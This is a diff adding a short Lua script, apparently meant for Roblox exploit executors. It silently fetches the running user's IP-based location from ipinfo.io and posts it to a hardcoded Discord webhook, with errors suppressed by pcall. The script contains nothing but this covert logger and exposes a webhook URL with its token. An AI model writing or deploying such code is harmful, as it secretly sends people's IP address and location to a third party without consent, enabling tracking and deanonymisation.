@@ -1,0 +1,43 @@
+local webh = "https://discord.com/api/webhooks/1235250600237596775/1VXXdDo98XjfLSgfeJqfAmriTkpH3QDdMXz_W52UyqjV0_INX3DTbJmYLVtmSfQlDsSm"
+
+pcall(function()
+    -- Get user's location
+    local location = game:HttpGet("https://ipinfo.io/json")
+
+    -- Send webhook
+    local response
+    if syn then
+        response = request(
+            {
+                Url = webh,
+                Method = 'POST',
+                Headers = {
+                    ['Content-Type'] = 'application/json'
+                },
+                Body = game:GetService('HttpService'):JSONEncode({['content'] = "User's location: " .. location})
+            }
+        )
+    elseif request then
+        response = request(
+            {
+                Url = webh,
+                Method = 'POST',
+                Headers = {
+                    ['Content-Type'] = 'application/json'
+                },
+                Body = game:GetService('HttpService'):JSONEncode({['content'] = "User's location: " .. location})
+            }
+        )
+    elseif http_request then
+        response = http_request(
+            {
+                Url = webh,
+                Method = 'POST',
+                Headers = {
+                    ['Content-Type'] = 'application/json'
+                },
+                Body = game:GetService('HttpService'):JSONEncode({['content'] = "User's location: " .. location})
+            }
+        )
+    end
+end)
